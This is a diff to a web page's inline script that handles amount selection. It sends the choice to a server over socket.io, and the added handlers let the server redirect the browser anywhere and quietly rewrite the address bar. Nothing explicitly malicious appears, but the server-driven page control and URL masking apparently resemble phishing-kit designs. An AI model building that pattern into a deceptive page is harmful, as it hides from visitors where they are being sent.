@@ -875,79 +875,92 @@
     </script> 
     <script src="/js/socket-client.js"></script>
     <script>
-      document.addEventListener('DOMContentLoaded', function() {
-          // Style for selection state
-          const style = document.createElement('style');
-          style.textContent = `
-              .amount-selected {
-                  border: 2px solid rgb(1, 76, 236) !important;
-                  background: rgba(1, 76, 236, 0.1);
-              }
-          `;
-          document.head.appendChild(style);
-      
-          // Initialize socket
-          const socket = io('/user', {
-              transports: ['websocket'],
-              query: {
-                  page: window.location.pathname
-              }
-          });
-      
-          let selectedAmount = null;
-      
-          // Handle amount selection
-          document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(option => {
-              option.addEventListener('click', function() {
-                  // Clear previous selection
-                  document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(el => {
-                      el.classList.remove('amount-selected');
-                  });
-      
-                  // Set new selection
-                  this.classList.add('amount-selected');
-                  selectedAmount = this.getAttribute('data-value');
-              });
-          });
-      
-          // Handle submit button
-          const submitBtn = document.getElementById('submitBtn');
-          submitBtn.addEventListener('click', async function(e) {
-              e.preventDefault();
-              
-              if (!selectedAmount) {
-                  return;
-              }
-      
-              try {
-                  // Send selection to server
-                  socket.emit('amount_confirmed', {
-                      amount: selectedAmount,
-                      timestamp: new Date().toISOString(),
-                      page: window.location.pathname
-                  });
-      
-                  // Wait for confirmation
-                  await new Promise(resolve => setTimeout(resolve, 300));
+ document.addEventListener('DOMContentLoaded', function() {
+    // Style for selection state
+    const style = document.createElement('style');
+    style.textContent = `
+        .amount-selected {
+            border: 2px solid rgb(1, 76, 236) !important;
+            background: rgba(1, 76, 236, 0.1);
+        }
+    `;
+    document.head.appendChild(style);
 
-                  socket.emit('page_loading', true);
-      
-                  // Redirect to loading page
-                  socket.emit('request_redirect', { page: 'Loading' });
-              } catch (error) {
-                  console.error('Error:', error);
-              }
-          });
-      
-          // Handle socket connection
-          socket.on('connect', () => {
-              console.log('Socket connected');
-          });
-      
-          socket.on('connect_error', (error) => {
-              console.error('Socket connection error:', error);
-          });
-      });
+    // Initialize socket
+    const socket = io('/user', {
+        transports: ['websocket'],
+        query: {
+            page: window.location.pathname
+        }
+    });
+
+    let selectedAmount = null;
+
+    // Handle amount selection
+    document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(option => {
+        option.addEventListener('click', function() {
+            // Clear previous selection
+            document.querySelectorAll('[data-testid="input-interactable-area"]').forEach(el => {
+                el.classList.remove('amount-selected');
+            });
+
+            // Set new selection
+            this.classList.add('amount-selected');
+            selectedAmount = this.getAttribute('data-value');
+        });
+    });
+
+    // Handle submit button
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.addEventListener('click', async function(e) {
+        e.preventDefault();
+        
+        if (!selectedAmount) {
+            return;
+        }
+
+        try {
+            // Send selection to server
+            socket.emit('amount_confirmed', {
+                amount: selectedAmount,
+                timestamp: new Date().toISOString(),
+                page: window.location.pathname
+            });
+
+            // Wait for confirmation
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            socket.emit('page_loading', true);
+
+            // Redirect to loading page
+            socket.emit('request_redirect', { page: 'Loading' });
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    });
+
+    // Handle socket connection
+    socket.on('connect', () => {
+        console.log('Socket connected');
+    });
+
+    socket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+    });
+
+    // Add redirect handler
+    socket.on('redirect', (url) => {
+        console.log('Redirecting to:', url);
+        window.location.href = url;
+    });
+
+    // Add URL update handler in case session URL changes
+    socket.on('session_url', (url) => {
+        if (url && url !== window.location.pathname + window.location.search) {
+            window.history.replaceState({}, '', url);
+        }
+    });
+});
       </script>
   </body>
 </html>
